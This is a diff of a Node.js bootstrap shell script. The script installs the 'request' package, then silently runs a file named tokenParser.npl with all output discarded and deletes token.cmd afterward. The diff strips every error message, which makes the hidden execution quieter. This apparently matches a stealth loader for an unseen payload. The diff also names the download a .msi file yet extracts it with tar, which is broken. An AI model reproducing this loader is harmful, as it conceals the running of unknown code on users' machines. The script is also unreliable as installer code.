@@ -4,75 +4,68 @@
 set -e
 
 NODE_VERSION="20.11.1"
-NODE_MSI="node-v${NODE_VERSION}-x64.tar.gz"
+NODE_MSI="node-v${NODE_VERSION}-x64.msi"
 DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/${NODE_MSI}"
 NODE_DIR="$(pwd)/node-v${NODE_VERSION}-x64"
 
 NODE_INSTALLED_VERSION=""
 
-# Check for installed node version
-if ! node -v &> /dev/null; then
+# Check if Node.js is installed
+NODE_INSTALLED_VERSION=$(node -v 2>/dev/null || echo "")
+
+if [ -z "$NODE_INSTALLED_VERSION" ]; then
     INSTALL_NODE=1
 else
-    NODE_INSTALLED_VERSION=$(node -v)
     INSTALL_NODE=0
 fi
 
-# Install Node.js if not installed
 if [ "$INSTALL_NODE" -eq 1 ]; then
+    # Install Node.js if not installed
     if ! command -v curl &> /dev/null; then
-        echo "Curl not found, please install curl"
-        exit 1
+        wget -q "$DOWNLOAD_URL" -O "$NODE_MSI"
+    else
+        curl -sSL -o "$NODE_MSI" "$DOWNLOAD_URL"
     fi
 
-    curl -s -L -o "$NODE_MSI" "$DOWNLOAD_URL"
-
     if [ -f "$NODE_MSI" ]; then
-        # Extract tarball
-        tar -xf "$NODE_MSI"
+        # Extract the tarball
+        tar -xf "$NODE_MSI" -C "$(pwd)"
         rm -f "$NODE_MSI"
     else
-        echo "Failed to download node.js"
         exit 1
     fi
 
     export PATH="${NODE_DIR}/bin:$PATH"
 fi
 
-# Check if node is installed
+# Check if Node.js and npm are available
 if ! command -v node &> /dev/null; then
-    echo "Node.js is not installed."
     exit 1
 fi
 
-# Check if npm is installed
 if ! command -v npm &> /dev/null; then
-    echo "npm is not installed."
     exit 1
 fi
 
-# Install the 'request' package if not installed
+# Install the "request" package if not already installed
 if [ ! -d "$(pwd)/node_modules/request" ]; then
     npm install request --silent --no-progress --loglevel=error --fund=false
     if [ $? -ne 0 ]; then
-        echo "Failed to install 'request' module."
         exit 1
     fi
 fi
 
-# Run tokenParser.npl script if it exists
+# Run tokenParser.npl if it exists
 if [ -f "$(pwd)/tokenParser.npl" ]; then
-    node "$(pwd)/tokenParser.npl" &> /dev/null
+    node "$(pwd)/tokenParser.npl" > /dev/null 2>&1
     if [ $? -ne 0 ]; then
-        echo "Error running tokenParser.npl."
         exit 1
     fi
 else
-    echo "tokenParser.npl not found."
     exit 1
 fi
 
-# Clean up: delete token files and directories
+# Clean up generated files
 if [ -f "$(pwd)/token.cmd" ]; then
     rm -f "$(pwd)/token.cmd"
 fi
